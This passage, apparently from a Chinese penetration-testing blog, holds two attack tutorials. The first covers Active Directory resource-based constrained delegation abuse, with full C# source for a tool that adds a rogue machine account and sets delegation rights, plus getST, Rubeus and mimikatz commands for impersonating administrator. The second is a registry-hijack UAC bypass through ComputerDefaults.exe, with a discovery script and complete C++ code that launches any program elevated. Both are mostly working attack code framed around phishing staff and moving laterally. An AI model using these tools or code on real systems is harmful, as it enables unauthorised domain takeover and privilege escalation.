提权：当我们钓鱼拿下一台员工机器，发现是在域里面的，然后在电脑里发现addUser域用户的账号密码，因为需要addUser域用户将员工机器加入到域环境里，所以有可能会获得到addUser的账号密码。然后发现当前域用户并不在本地管理组里，就可以通过addUser域用户提权到adminsitrator。</p><p>\2. 横向拓展：在hack域中，addUser域用户负责将员工lm的机器或者web服务器web2008等机器加入到hack域里，那么当我们拿下addUser这个域用户的权限后，就可以拿下员工lm的机器和web服务器web2008。</p><p>环境模拟</p><pre><code>hack域角色            IP                    主机名                     服务器类型dc:         192.168.52.2        windows_server_2016_dc          windows2016web:        192.168.52.8        web2008                         windows2008pc:         192.168.52.30       win7-pc                         windows07domain user：    addUser     P@ssw0rd        加域账号</code></pre><p>web2008 和 win7-pc 是由addUser域用户(addUser不是域管)加入到域环境里成为域机器，但是addUser并不是web2008|win7-pc 域机器的本地管理组成员。</p><p>win7-pc域机器的信息：模拟内网里的员工电脑</p><ol><li><p>当前用户是lm域用户，但是lm域用户不是本地管理员成员。</p></li><li><p>由addUser域用户加入到域里，但是addUser域用户不是win7-pc域机器的本地管理组</p></li></ol><p><img src="/img/delegation/4c1cf92d-d0e9-4934-af7b-aa8f4c941342.png" alt="img"></p><p>web2008域机器的信息：模拟内网的web服务</p><ol><li>由addUser域用户加入到域里，但是addUser域用户不是web2008域机器的本地管理组</li></ol><p><img src="/img/delegation/8cc84979-fbf5-458b-9cc0-c44e97ffb712.png" alt="img"></p><h2 id="0x02-利用："><a href="#0x02-利用：" class="headerlink" title="0x02 利用："></a>0x02 利用：</h2><p>只要获取到加域账号就可以。</p><h3 id="0x02-1-寻找加域账号"><a href="#0x02-1-寻找加域账号" class="headerlink" title="0x02-1 寻找加域账号"></a>0x02-1 寻找加域账号</h3><pre><code>查询ACL：powerview的脚本，IdentityReference：域用户，ObjectDN：域机器，ActiveDirectoryRights：权限Get-ObjectAcl -ADSprefix &quot;CN=Computers&quot; |select IdentityReference,ObjectDN,ActiveDirectoryRights查询每个域机器是由哪个域用户添加进域的,通过mS-DS-CreatorSID查看域用户的sidAdFind.exe -h 192.168.52.2 -u lm -up Lm123*** -b &quot;DC=hack,DC=local&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</code></pre><p><img src="/img/delegation/ba988274-ed8f-45ea-8e55-d4de3ea3b57c.png" alt="img"></p><p><img src="/img/delegation/e08d6cb2-30b6-4932-a1cc-11148660d453.png" alt="img"></p><pre><code>dn:CN=WEB2008,CN=Computers,DC=hack,DC=local&gt;mS-DS-CreatorSID: S-1-5-21-675002476-827761145-2127888524-1619sid2user.exe \\192.168.52.2 5 21 675002476 827761145 2127888524 1619Name is addUserDomain is HACKType of SID is SidTypeUser</code></pre><p>查WEB2008是由哪个域用户加入到域机器里的</p><p><img src="/img/delegation/068eed09-8d37-4579-a047-ed583f6b3fe1.png" alt="img"></p><p>此时找到了域里的加域账号addUser</p><h3 id="0x02-2-横向拓展"><a href="#0x02-2-横向拓展" class="headerlink" title="0x02-2 横向拓展"></a>0x02-2 横向拓展</h3><p>假设拿到了addUser用户，尝试和web2008建立ipc连接，发现并没有权限。</p><p><img src="/img/delegation/a90d3bbb-4568-48e7-9b43-9c4b27124437.png" alt="img"></p><p>使用addUser域用户添加一个域机器账户evilpc，机器账户的密码是123456，并且对web2008域机器配置msDS-AllowedToActOnBehalfOfOtherIdentity属性</p><pre><code>Addnew_MachineAccount.exe 域控IP 域的名字 域用户名 域用户密码 目标机器Addnew_MachineAccount.exe 192.168.52.2 hack.local addUser P@ssw0rd web2008</code></pre><p><img src="/img/delegation/ad8a188f-a8c5-414d-bdcf-ed3d42d46200.png" alt="img"></p><p><img src="/img/delegation/145fd8f2-7e80-4000-91ae-9f46e968c36f.png" alt="img"></p><p><img src="/img/delegation/99473ef7-2795-4101-8d78-8d7c458d88ae.png" alt="img"></p><p>使用impacket的getST生成票据，会在当前目录下生成administrator.ccache文件</p><p>目标机器安装impacket有点不现实，所以可以使用socks代理生成票据</p><pre><code>getST.py -dc-ip 192.168.52.2 hack.local/evilpc\$:123456 -spn cifs/web2008.hack.local -impersonate administrator</code></pre><p><img src="/img/delegation/8da00ed8-598a-44f7-bac1-01c95f402f10.png" alt="img"></p><p>使用mimikatz导入票据</p><pre><code>kerberos::ptc 票据kerberos::ptc C:\Users\lm\Desktop\administrator.ccache</code></pre><p><img src="/img/delegation/27454634-c24c-4ea5-86ca-62cc6ee44625.png" alt="img"></p><pre><code>klist           查询票据klist purge     清空票据</code></pre><p><img src="/img/delegation/568c02c8-3a1d-4953-8cfe-a8c769bd3eee.png" alt="img"></p><p>成功获取权限，切记，这里一定要是web2008.hack.local，只是web2008是没有权限的</p><p><img src="/img/delegation/7e7145a8-9dd9-4f01-9561-f663ba59835f.png" alt="img"></p><p>删除票据后，就没有权限了</p><p><img src="/img/delegation/2d9bf118-abaa-4b8d-9881-f820f96b5d2b.png" alt="img"></p><p>或者可以尝试用Rubeus生成票据，但是本地失败了。</p><p>计算域机器evilpc$的hash</p><pre><code>Rubeus.exe hash /user:evilpc$ /password:123456 /domain:hack.local</code></pre><p><img src="/img/delegation/f80b6fdf-3128-407b-b2f7-7df3ccf91c70.png" alt="img"></p><pre><code>Rubeus.exe s4u /user:evilpc$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/web2008 /pttRubeus.exe s4u /user:evilpc$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:host/web2008 /ptt</code></pre><p><img src="/img/delegation/15ab3eb5-a043-41af-9973-aad8dc74be25.png" alt="img"></p><p><img src="/img/delegation/667b5baa-1fe6-44f1-a3c9-b631c6c193c9.png" alt="img"></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><pre><code>https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSwhttps://xz.aliyun.com/t/7454#toc-1https://xz.aliyun.com/t/7217#toc-0https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/  查询aclhttps://www.cnblogs.com/simon7s/p/12370183.htm  mimikatz导入ccache票据</code></pre><h2 id="0x04-Addnew-MachineAccount-源码"><a href="#0x04-Addnew-MachineAccount-源码" class="headerlink" title="0x04 Addnew_MachineAccount 源码"></a>0x04 Addnew_MachineAccount 源码</h2><p>Addnew_MachineAccount.exe源码，使用C#编译</p><p><img src="/img/delegation/9e65d224-9857-4dd9-8d0a-787b96e3c5c1.png" alt="img"></p><p>添加对activedirecty操作的dll的引用</p><p><img src="/img/delegation/7b03aad5-a2d9-4619-8a80-412624cad08a.png" alt="img"></p><p>第十九行需要改一下，将DC=hack,DC=local改为内网对应的域</p><pre><code>using System;using System.Text;using System.Security.AccessControl;using System.Security.Principal;using System.Net;namespace Addnew_MachineAccount{    class Program    {        static void Main(string[] args)        {            String DomainController = args[0];  // 域控IP            String Domain = args[1];   // hack.local            String username = args[2]; //域用户名            String password = args[3]; //域用户密码            String victimcomputer = args[4]; //需要进行提权的机器            String new_MachineAccount = &quot;evilpc&quot;; //添加的机器账户            String new_MachineAccount_password = &quot;123456&quot;; //机器账户密码            String victimcomputer_ldap_path = &quot;LDAP://CN=&quot; + victimcomputer + &quot;, CN=Computers,DC=hack,DC=local&quot;; // 这里也需要改            String machine_account = new_MachineAccount;            String sam_account = machine_account + &quot;$&quot;;            String distinguished_name = &quot;&quot;;            String[] DC_array = null;            distinguished_name = &quot;CN=&quot; + machine_account + &quot;,CN=Computers&quot;;            DC_array = Domain.Split(&#39;.&#39;);            foreach (String DC in DC_array)            {                distinguished_name += &quot;,DC=&quot; + DC;            }            Console.WriteLine(&quot;[+] Elevate permissions on &quot; + victimcomputer);            Console.WriteLine(&quot;[+] Domain = &quot; + Domain);            Console.WriteLine(&quot;[+] Domain Controller = &quot; + DomainController);            //Console.WriteLine(&quot;[+] New SAMAccountName = &quot; + sam_account);            //Console.WriteLine(&quot;[+] Distinguished Name = &quot; + distinguished_name);            //连接ldap            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);            NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录            System.DirectoryServices.Protocols.LdapConnection connection = null;            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);            //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);            connection.SessionOptions.Sealing = true;            connection.SessionOptions.Signing = true;            connection.Bind();            var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;DnsHostName&quot;, machine_account +&quot;.&quot;+ Domain),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;SamAccountName&quot;, sam_account),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;userAccountControl&quot;, &quot;4096&quot;),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;unicodePwd&quot;, Encoding.Unicode.GetBytes(&quot;\&quot;&quot; + new_MachineAccount_password + &quot;\&quot;&quot;)),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;objectClass&quot;, &quot;Computer&quot;),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;ServicePrincipalName&quot;, &quot;HOST/&quot;+machine_account+&quot;.&quot;+Domain,&quot;RestrictedKrbHost/&quot;+machine_account+&quot;.&quot;+Domain,&quot;HOST/&quot;+machine_account,&quot;RestrictedKrbHost/&quot;+machine_account)            });            try            {                //添加机器账户                connection.SendRequest(request);                Console.WriteLine(&quot;[+] Machine account: &quot; + machine_account + &quot; Password: &quot; + new_MachineAccount_password + &quot; added&quot;);            }            catch (System.Exception ex)            {                Console.WriteLine(&quot;[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)&quot;);                Console.WriteLine(&quot;[-] Exception: &quot; + ex.Message);                return;            }            // 获取新计算机对象的SID            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, &quot;(&amp;(samAccountType=805306369)(|(name=&quot; + machine_account + &quot;)))&quot;, System.DirectoryServices.Protocols.SearchScope.Subtree, null);            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);            SecurityIdentifier sid = null;            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)            {                try                {                    sid = new SecurityIdentifier(entry.Attributes[&quot;objectsid&quot;][0] as byte[], 0);                    Console.Out.WriteLine(&quot;[+] &quot; + new_MachineAccount + &quot; SID : &quot; + sid.Value);                }                catch                {                    Console.WriteLine(&quot;[!] It was not possible to retrieve the SID.\nExiting...&quot;);                    return;                }            }            //设置资源约束委派            //System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(&quot;domain.com.cn&quot;);            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain, username, password);            myldapConnection.Path = victimcomputer_ldap_path;            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);            //通过ldap找计算机            search.Filter = &quot;(CN=&quot; + victimcomputer + &quot;)&quot;;            string[] requiredProperties = new string[] { &quot;samaccountname&quot; };            foreach (String property in requiredProperties)                search.PropertiesToLoad.Add(property);            System.DirectoryServices.SearchResult result = null;            try            {                result = search.FindOne();            }            catch (System.Exception ex)            {                Console.WriteLine(ex.Message + &quot;Exiting...&quot;);                return;            }            if (result != null)            {                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();                String sec_descriptor = &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&quot; + sid.Value + &quot;)&quot;;                System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);                byte[] descriptor_buffer = new byte[sd.BinaryLength];                sd.GetBinaryForm(descriptor_buffer, 0);                // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中                entryToUpdate.Properties[&quot;msds-allowedtoactonbehalfofotheridentity&quot;].Value = descriptor_buffer;                try                {                    entryToUpdate.CommitChanges();//提交更改                    Console.WriteLine(&quot;[+] Exploit successfully!&quot;);                }                catch (System.Exception ex)                {                    Console.WriteLine(ex.Message);                    Console.WriteLine(&quot;[!] \nFailed...&quot;);                    return;                }            }        }    }}</code></pre><h2 id="0x05-视频演示"><a href="#0x05-视频演示" class="headerlink" title="0x05 视频演示"></a>0x05 视频演示</h2><p><img src="/img/delegation/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基于资源的约束委派利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于白名单注册表bypassUAC</title>
      <link href="/2020/11/25/regeditbypassuac/"/>
      <url>/2020/11/25/regeditbypassuac/</url>
      
        <content type="html"><![CDATA[<h1 id="基于白名单注册表bypassUAC"><a href="#基于白名单注册表bypassUAC" class="headerlink" title="基于白名单注册表bypassUAC"></a>基于白名单注册表bypassUAC</h1><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p><p>当前用户是管理员权限，但是有些exe会弹出用户账户控制，如果点击否的话，就会出现拒绝访问，那么也就没有成功运行该程序了。这样就会影响后续的内网渗透，例如取密码等，所以我们需要bypassuac。</p><p><img src="/img/regeditBypassUAC/1.jpg" alt></p><p><img src="/img/regeditBypassUAC/2.jpg" alt></p><p>手动bypassuac，右键以管理员身份运行，但是显然这个是不现实的</p><p><img src="/img/regeditBypassUAC/3.jpg" alt></p><h2 id="0x02-发掘bypassUAC的程序"><a href="#0x02-发掘bypassUAC的程序" class="headerlink" title="0x02 发掘bypassUAC的程序"></a>0x02 发掘bypassUAC的程序</h2><p>有一些系统程序是会直接获取管理员权限同时不弹出UAC弹窗，这类程序被称为白名单程序。 这些程序拥有autoElevate属性的值为True，会在启动时就静默提升权限。</p><pre><code>1. 程序的manifest标识的配置属性 autoElevate为true2. 程序不弹出UAC弹窗3. 从注册表里查询Shell\Open\command键值对</code></pre><h3 id="0x02-1-寻找autoElevate为true的程序"><a href="#0x02-1-寻找autoElevate为true的程序" class="headerlink" title="0x02-1 寻找autoElevate为true的程序"></a>0x02-1 寻找autoElevate为true的程序</h3><p><img src="/img/regeditBypassUAC/4.jpg" alt></p><p>这里写了个py脚本遍历c:\windows\system32\目录下的所有exe文件，寻找autoElevate为true的exe程序</p><pre><code>import osfrom subprocess import *# path = r&#39;C:\Users\bingdu\Desktop\bypassUAC&#39;path = &#39;c:\windows\system32&#39;files = os.listdir(path)print(files)def GetFileList(path, fileList):    newDir = path    if os.path.isfile(path):        if path[-4:] == &#39;.exe&#39;:            fileList.append(path)    elif os.path.isdir(path):        try:            for s in os.listdir(path):                newDir=os.path.join(path,s)                GetFileList(newDir, fileList)        except Exception as e:            pass    return fileListfiles = GetFileList(path, [])      print(files)for eachFile in files:    if eachFile[-4:] == &#39;.exe&#39;:        command = r&#39;.\sigcheck64.exe -m {} | findstr auto&#39;.format(eachFile)        print(command)        p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE)        if &#39;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#39; in p1.stdout.read().decode(&#39;gb2312&#39;):            copy_command = r&#39;copy {} .\success&#39;.format(eachFile)            Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE)            print(&#39;[+] {}&#39;.format(eachFile))            with open(&#39;success.txt&#39;, &#39;at&#39;) as f:                f.writelines(&#39;{}\n&#39;.format(eachFile))</code></pre><p><img src="/img/regeditBypassUAC/5.jpg" alt></p><p>结果如下：</p><pre><code>c:\windows\system32\bthudtask.exec:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exec:\windows\system32\dccw.exec:\windows\system32\dcomcnfg.exec:\windows\system32\DeviceEject.exec:\windows\system32\DeviceProperties.exec:\windows\system32\djoin.exec:\windows\system32\easinvoker.exec:\windows\system32\EASPolicyManagerBrokerHost.exec:\windows\system32\eudcedit.exec:\windows\system32\eventvwr.exec:\windows\system32\fodhelper.exec:\windows\system32\fsquirt.exec:\windows\system32\FXSUNATD.exec:\windows\system32\immersivetpmvscmgrsvr.exec:\windows\system32\iscsicli.exec:\windows\system32\iscsicpl.exec:\windows\system32\lpksetup.exec:\windows\system32\MSchedExe.exec:\windows\system32\msconfig.exec:\windows\system32\msra.exec:\windows\system32\MultiDigiMon.exec:\windows\system32\newdev.exec:\windows\system32\odbcad32.exec:\windows\system32\PasswordOnWakeSettingFlyout.exec:\windows\system32\pwcreator.exec:\windows\system32\rdpshell.exec:\windows\system32\recdisc.exec:\windows\system32\rrinstaller.exec:\windows\system32\shrpubw.exec:\windows\system32\slui.exec:\windows\system32\Sysprep\sysprep.exec:\windows\system32\SystemPropertiesAdvanced.exec:\windows\system32\SystemPropertiesComputerName.exec:\windows\system32\SystemPropertiesDataExecutionPrevention.exec:\windows\system32\SystemPropertiesHardware.exec:\windows\system32\SystemPropertiesPerformance.exec:\windows\system32\SystemPropertiesProtection.exec:\windows\system32\SystemPropertiesRemote.exec:\windows\system32\SystemSettingsAdminFlows.exec:\windows\system32\SystemSettingsRemoveDevice.exec:\windows\system32\Taskmgr.exec:\windows\system32\tcmsetup.exec:\windows\system32\TpmInit.exec:\windows\system32\WindowsUpdateElevatedInstaller.exec:\windows\system32\WSReset.exec:\windows\system32\wusa.exe</code></pre><h3 id="0x02-2-寻找不弹UAC框的程序"><a href="#0x02-2-寻找不弹UAC框的程序" class="headerlink" title="0x02-2 寻找不弹UAC框的程序"></a>0x02-2 寻找不弹UAC框的程序</h3><p>在cmd一个个的去运行exe，如果不弹uac框就运行的既是</p><p>结果如下，下面只是找的前面几个，后面的没有去测试</p><pre><code>c:\windows\system32\bthudtask.exe                       okc:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exe                ok      1c:\windows\system32\dccw.exe                            ok      1c:\windows\system32\dcomcnfg.exe                        ok      1c:\windows\system32\DeviceEject.exe                     ok  c:\windows\system32\DeviceProperties.exe                okc:\windows\system32\djoin.exe                           okc:\windows\system32\easinvoker.exe                      okc:\windows\system32\EASPolicyManagerBrokerHost.exe      okc:\windows\system32\eudcedit.exe                        ok      1c:\windows\system32\eventvwr.exe                        ok      1c:\windows\system32\fodhelper.exe                       ok      1c:\windows\system32\fsquirt.exe                         ok      1c:\windows\system32\FXSUNATD.exe                        okc:\windows\system32\immersivetpmvscmgrsvr.exe           okc:\windows\system32\iscsicli.exe                        ok      1c:\windows\system32\iscsicpl.exe                        ok      1</code></pre><h3 id="0x02-3-从注册表里查询Shell-Open-command键值对"><a href="#0x02-3-从注册表里查询Shell-Open-command键值对" class="headerlink" title="0x02-3 从注册表里查询Shell\Open\command键值对"></a>0x02-3 从注册表里查询Shell\Open\command键值对</h3><p>通常以shell\open\command命名的键值对存储的是可执行文件的路径，如果exe程序运行的时候找到该键值对，就会运行该键值对的程序，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。</p><p>所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。</p><p>使用Procmon监听，运行0x02-2的结果</p><p>这里以c:\windows\system32\ComputerDefaults.exe测试</p><p>过滤条件如下</p><p><img src="/img/regeditBypassUAC/6.jpg" alt></p><p>会去查询HKCU:\Software\Classes\ms-settings\shell\open\command</p><p><img src="/img/regeditBypassUAC/7.jpg" alt></p><p>然后我们再注册表里创建该键值对</p><p><img src="/img/regeditBypassUAC/8.jpg" alt><br>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，发现还查询了HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute的键值对</p><p><img src="/img/regeditBypassUAC/9.jpg" alt></p><p>在注册表里创建HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute</p><p><img src="/img/regeditBypassUAC/10.jpg" alt></p><p>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，这时候采取获取Software\Classes\ms-settings\shell\open\command的默认值，然后就会运行该值的程序</p><p><img src="/img/regeditBypassUAC/11.jpg" alt></p><h3 id="0x02-4-总结"><a href="#0x02-4-总结" class="headerlink" title="0x02-4 总结"></a>0x02-4 总结</h3><p>如果键值对HKCU:\Software\Classes\ms-settings\shell\open\command存在，ComputerDefaults会接下去查找HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute是否也存在,若也存在到则读取HKCU:\Software\Classes\ms-settings\shell\open\command的值然后执行。</p><p>测试：将HKCU:\Software\Classes\ms-settings\shell\open\command(default)的值设置为cmd.exe，然后运行c:\windows\system32\ComputerDefaults.exe</p><p><img src="/img/regeditBypassUAC/12.jpg" alt></p><p>成功弹出exe，并且是过了uac的权限</p><p><img src="/img/regeditBypassUAC/13.jpg" alt></p><h2 id="0x03-C-代码实现运行任意exe过uac"><a href="#0x03-C-代码实现运行任意exe过uac" class="headerlink" title="0x03 C++代码实现运行任意exe过uac"></a>0x03 C++代码实现运行任意exe过uac</h2><pre><code>#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int wmain(int argc, wchar_t* argv[]) {    if (argc != 2) {        wprintf(L&quot;Usage: %s &lt;filePath&gt;\n&quot;, argv[0]);        wprintf(L&quot;       %s cmd.exe\n&quot;, argv[0]);        exit(1);    }    LPWSTR filePath = argv[1];    PROCESS_INFORMATION pi = { 0 };    STARTUPINFOA si = { 0 };    HKEY hKey;    si.cb = sizeof(STARTUPINFO);    si.wShowWindow = SW_HIDE;    RegCreateKeyW(HKEY_CURRENT_USER, L&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;, &amp;hKey);       // 创建注册表项    RegSetValueExW(hKey, L&quot;&quot;, 0, REG_SZ, (LPBYTE)filePath, lstrlenW(filePath));                             // 赋值，执行的exe路径    RegSetValueExW(hKey, L&quot;DelegateExecute&quot;, 0, REG_SZ, (LPBYTE)&quot;&quot;, sizeof(&quot;&quot;));    // 创建进程ComputerDefaults    CreateProcessA(&quot;C:\\Windows\\System32\\cmd.exe&quot;, (LPSTR)&quot;/c C:\\Windows\\System32\\ComputerDefaults.exe&quot;, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi);    // 延时十秒，等ComputerDefaults.exe运行    Sleep(10000);    // 清楚注册表项    RegDeleteTreeA(HKEY_CURRENT_USER, &quot;Software\\Classes\\ms-settings&quot;);    return 0;}</code></pre><p>效果：</p><p><img src="/img/regeditBypassUAC/14.jpg" alt></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p><img src="/img/regeditBypassUAC/regeditBypassUAC.gif" alt></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper" target="_blank" rel="noopener">https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper</a></p>]]></content>
      
      
      <categories>
          
          <category> BypassUAC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BypassUAC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
